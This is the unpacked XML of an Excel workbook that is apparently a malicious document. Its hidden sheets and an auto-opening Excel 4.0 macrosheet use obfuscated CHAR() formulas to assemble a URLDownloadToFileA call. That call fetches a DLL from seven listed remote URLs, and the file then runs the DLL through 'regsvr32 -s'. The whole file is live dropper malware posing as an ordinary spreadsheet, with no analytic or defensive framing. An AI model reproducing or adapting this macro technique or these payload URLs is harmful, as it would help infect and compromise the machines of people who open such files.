
<file path=[Content_Types].xml><?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"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macrosheets/intlsheet1.xml" ContentType="application/vnd.ms-excel.intlmacro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Posik\Desktop\File3\15m\CIR-ZV\ZV\1\V\V\Новая папка\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{88C2E585-B762-4046-8B16-458A81959204}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-120" windowWidth="20730" windowHeight="11160" firstSheet="1" activeTab="1" xr2:uid="{00000000-000D-0000-FFFF-FFFF00000000}"/>
  </bookViews>
  <sheets>
    <sheet name="Eggedv" sheetId="2" state="hidden" r:id="rId1"/>
    <sheet name="Sheet" sheetId="3" r:id="rId2"/>
    <sheet name="Lefs" sheetId="4" state="hidden" r:id="rId3"/>
    <sheet name="LFEVE" sheetId="5" state="hidden" r:id="rId4"/>
    <sheet name="O1" sheetId="6" state="hidden" r:id="rId5"/>
    <sheet name="O2" sheetId="7" state="hidden" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="DPFW1">LFEVE!$F$11</definedName>
    <definedName name="DPFW2">LFEVE!$F$13</definedName>
    <definedName name="DPFW3">LFEVE!$F$15</definedName>
    <definedName name="DPFW4">LFEVE!$F$17</definedName>
    <definedName name="DPFW5">LFEVE!$F$19</definedName>
    <definedName name="DPFW6">LFEVE!$F$21</definedName>
    <definedName name="DPFW7">LFEVE!$F$23</definedName>
    <definedName name="_xlnm.Auto_Open">LFEVE!$F$1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R17" i="3" l="1"/>
  <c r="M11" i="3"/>
  <c r="O8" i="3"/>
  <c r="C8" i="3"/>
  <c r="I5" i="3"/>
  <c r="K37" i="2"/>
  <c r="Q36" i="2"/>
  <c r="E35" i="2"/>
  <c r="O33" i="2"/>
  <c r="I32" i="2"/>
  <c r="I26" i="2"/>
  <c r="G24" i="2"/>
  <c r="K23" i="2"/>
  <c r="P22" i="2"/>
  <c r="P20" i="2"/>
  <c r="P19" i="2"/>
  <c r="B18" i="2"/>
  <c r="P17" i="2"/>
  <c r="I17" i="2"/>
  <c r="D17" i="2"/>
  <c r="P15" i="2"/>
  <c r="F15" i="2"/>
  <c r="B15" i="2"/>
  <c r="K14" i="2"/>
  <c r="G14" i="2"/>
  <c r="P13" i="2"/>
  <c r="H13" i="2"/>
  <c r="D13" i="2"/>
  <c r="A12" i="2"/>
  <c r="P11" i="2"/>
  <c r="L11" i="2"/>
  <c r="J11" i="2"/>
  <c r="E11" i="2"/>
  <c r="F10" i="2"/>
  <c r="P9" i="2"/>
  <c r="K9" i="2"/>
  <c r="H9" i="2"/>
  <c r="C9" i="2"/>
  <c r="P7" i="2"/>
  <c r="M7" i="2"/>
  <c r="D7" i="2"/>
  <c r="J6" i="2"/>
  <c r="E6" i="2"/>
  <c r="P5" i="2"/>
  <c r="B5" i="2"/>
  <c r="N4" i="2"/>
  <c r="H4" i="2"/>
  <c r="F4" i="2"/>
  <c r="P3" i="2"/>
  <c r="I3" i="2"/>
  <c r="C3" i="2"/>
  <c r="L2" i="2"/>
  <c r="G2" i="2"/>
  <c r="E2" i="2"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="20" uniqueCount="20">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t>SysWow64\</t>
  </si>
  <si>
    <t xml:space="preserve"> ..\rfs.dll</t>
  </si>
  <si>
    <t>\Windows\</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>e</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>"..\rfs.dll</t>
  </si>
  <si>
    <t>regsvr32.exe</t>
  </si>
  <si>
    <t>"https://casache.com/web/n3jxwXXwa/",</t>
  </si>
  <si>
    <t>"https://www.blessingsource.com/blessingsource.com/rFQ0Ip6lQXXK/",</t>
  </si>
  <si>
    <t>"http://ccalaire.com/wp-admin/d1pGRa0X/",</t>
  </si>
  <si>
    <t>"http://cdimprintpr.com/brochure2/A9NmYDndZ/",</t>
  </si>
  <si>
    <t>"http://careerplan.host20.uk/images/Ls/",</t>
  </si>
  <si>
    <t>"http://ausnz.net/2010wc/odSi5tQKkCIXEWl9/",</t>
  </si>
  <si>
    <t>"https://azsiacenter.com/js/sOhmiosLJOgwaP6i5nln/",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</si>
</sst>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57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BF6B7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18" fillId="33" borderId="0" xfId="0" applyFont="1" applyFill="1"/>
    <xf numFmtId="0" fontId="18" fillId="0" borderId="0" xfId="0" applyFont="1"/>
  </cellXfs>
  <cellStyles count="42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0"/>
  <tableStyles count="0" defaultTableStyle="TableStyleMedium2" defaultPivotStyle="PivotStyleLight16"/>
  <colors>
    <mruColors>
      <color rgb="FFFBF6B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5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet4.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="calcChain.xml"/><Relationship Id="rId4" Type="http://schemas.microsoft.com/office/2006/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet1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14</xdr:col>
      <xdr:colOff>30064</xdr:colOff>
      <xdr:row>0</xdr:row>
      <xdr:rowOff>276224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581A9C89-A5EB-43E5-A25A-805470B0AB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564464" cy="276224"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
      </xdr:spPr>
    </xdr:pic>
    <xdr:clientData/>
  </xdr:twoCellAnchor>
</xdr:wsDr>
</file>

<file path=xl/macrosheets/intl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B9128991-9E66-4361-927B-AE414DD7E4DF}">
  <dimension ref="F7"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="F8" sqref="F8"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="7.7109375" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="5" max="5" width="7.5703125" customWidth="1"/>
    <col min="6" max="6" width="19.140625" hidden="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="7" spans="6:6" x14ac:dyDescent="0.25">
      <c r="F7" t="b">
        <f>FORMULA(Eggedv!P22&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!E14&amp;Lefs!S17&amp;Lefs!F18,F11)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW1"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!F16&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F13)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW2"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!G14&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F15)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW3"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!H16&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F17)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW4"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!I14&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F19)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW5"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!J16&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F21)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW6"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!L2&amp;Eggedv!B15&amp;Eggedv!B15&amp;Sheet!C8&amp;Sheet!I5&amp;Eggedv!F10&amp;Sheet!M11&amp;'O2'!B2&amp;Eggedv!L2&amp;Sheet!O8&amp;Lefs!J19&amp;Sheet!K14&amp;Lefs!S17&amp;Lefs!F18&amp;Eggedv!P13,F23)=FORMULA(Eggedv!P22&amp;Eggedv!J11&amp;Eggedv!B18&amp;Eggedv!P11&amp;"DPFW7"&amp;Lefs!Q7&amp;Eggedv!H9&amp;Eggedv!B15&amp;Eggedv!I17&amp;Eggedv!I3&amp;Eggedv!H13&amp;Eggedv!P11&amp;Eggedv!K9&amp;Eggedv!P13&amp;Eggedv!P7&amp;Eggedv!P13,F25)=FORMULA(Eggedv!P22&amp;Eggedv!H13&amp;Eggedv!N4&amp;Eggedv!H13&amp;Eggedv!H9&amp;Eggedv!P11&amp;Eggedv!P15&amp;Eggedv!H9&amp;Eggedv!P20&amp;Lefs!M14&amp;Lefs!N10&amp;Lefs!I6&amp;Sheet!R17&amp;Lefs!G12&amp;Eggedv!P15&amp;Eggedv!P13,F27)=FORMULA(Eggedv!P22&amp;Eggedv!G24&amp;Eggedv!H13&amp;Eggedv!E6&amp;Eggedv!E11&amp;Eggedv!G24&amp;Eggedv!K23&amp;Eggedv!P11&amp;Eggedv!P13,F33)</f>
        <v>1</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
</xm:macrosheet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D28BE-B617-477B-A293-1DAADB787060}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView topLeftCell="A13" workbookViewId="0">
      <selection activeCell="G6" sqref="G6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4">
        <v>1</v>
      </c>
      <c r="N4" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7">
        <v>3</v>
      </c>
      <c r="M7" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13">
        <v>2</v>
      </c>
      <c r="P13" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" t="s">
        <v>1</v>
      </c>
      <c r="P17" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P19" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20">
        <v>8</v>
      </c>
      <c r="P20" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37">
        <f>_xlfn.ARABIC("CI")</f>
        <v>101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997D5-0CD5-469C-9A3F-DDB3B28D8A59}">
  <dimension ref="C1:R17"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="AM66" sqref="AM66"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="3:15" s="1" customFormat="1" ht="21.75" customHeight="1" x14ac:dyDescent="0.25"/>
    <row r="5" spans="3:15" x14ac:dyDescent="0.25">
      <c r="I5" s="2" t="str">
        <f>T(Eggedv!A12&amp;Eggedv!E2&amp;Eggedv!D7&amp;Eggedv!P15&amp;Eggedv!P7&amp;Eggedv!P15&amp;Eggedv!E11&amp;Eggedv!F4&amp;Eggedv!B15&amp;Eggedv!D13&amp;Eggedv!E2)</f>
        <v>mon","URLDo</v>
      </c>
    </row>
    <row r="8" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C8" s="2" t="str">
        <f>T(Eggedv!P11&amp;Eggedv!P15&amp;Eggedv!B5&amp;Eggedv!C3&amp;Eggedv!C9)</f>
        <v>("url</v>
      </c>
      <c r="O8" s="2" t="str">
        <f>T(Eggedv!P15&amp;Eggedv!P7&amp;Eggedv!P15&amp;Eggedv!J6&amp;Eggedv!J6&amp;Eggedv!H9&amp;Eggedv!H9&amp;Eggedv!K14&amp;Eggedv!K14&amp;Eggedv!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="11" spans="3:15" x14ac:dyDescent="0.25">
      <c r="M11" s="2" t="str">
        <f>T(Eggedv!D7&amp;Eggedv!C9&amp;Eggedv!E2&amp;Eggedv!D17&amp;Eggedv!F15&amp;Eggedv!E6&amp;Eggedv!E2&amp;Eggedv!B18&amp;Eggedv!G2&amp;Eggedv!C9)</f>
        <v>nloadToFil</v>
      </c>
    </row>
    <row r="14" spans="3:15" x14ac:dyDescent="0.25">
      <c r="E14" s="2" t="s">
        <v>13</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>15</v>
      </c>
      <c r="I14" s="2" t="s">
        <v>17</v>
      </c>
      <c r="K14" s="2" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="16" spans="3:15" x14ac:dyDescent="0.25">
      <c r="F16" s="2" t="s">
        <v>14</v>
      </c>
      <c r="H16" s="2" t="s">
        <v>16</v>
      </c>
      <c r="J16" s="2" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="17" spans="18:18" x14ac:dyDescent="0.25">
      <c r="R17" s="2" t="str">
        <f>T(Eggedv!P19&amp;Eggedv!P2&amp;Eggedv!M7)</f>
        <v xml:space="preserve"> -s</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup paperSize="9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312BE8-4A9D-4C0D-ABAA-83C6A0FE176D}">
  <dimension ref="F6:S19"/>
  <sheetViews>
    <sheetView topLeftCell="C1" workbookViewId="0">
      <selection activeCell="I7" sqref="I7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="6" spans="7:17" x14ac:dyDescent="0.25">
      <c r="I6" t="s">
        <v>12</v>
      </c>
    </row>
    <row r="7" spans="7:17" x14ac:dyDescent="0.25">
      <c r="Q7" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="10" spans="7:17" x14ac:dyDescent="0.25">
      <c r="N10" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="12" spans="7:17" x14ac:dyDescent="0.25">
      <c r="G12" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="14" spans="7:17" x14ac:dyDescent="0.25">
      <c r="M14" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="17" spans="6:19" x14ac:dyDescent="0.25">
      <c r="S17" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="18" spans="6:19" x14ac:dyDescent="0.25">
      <c r="F18" t="s">
        <v>8</v>
      </c>
    </row>
    <row r="19" spans="6:19" x14ac:dyDescent="0.25">
      <c r="J19" t="s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B2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="C6" sqref="C6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="2:2" x14ac:dyDescent="0.25">
      <c r="B2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Макросы Excel 4.0</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="6" baseType="lpstr">
      <vt:lpstr>Eggedv</vt:lpstr>
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Lefs</vt:lpstr>
      <vt:lpstr>O1</vt:lpstr>
      <vt:lpstr>O2</vt:lpstr>
      <vt:lpstr>LFEVE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USA</dc:creator>
  <cp:lastModifiedBy>Ofsfgse</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:17:20Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-16T06:51:40Z</dcterms:modified>
</cp:coreProperties>
</file>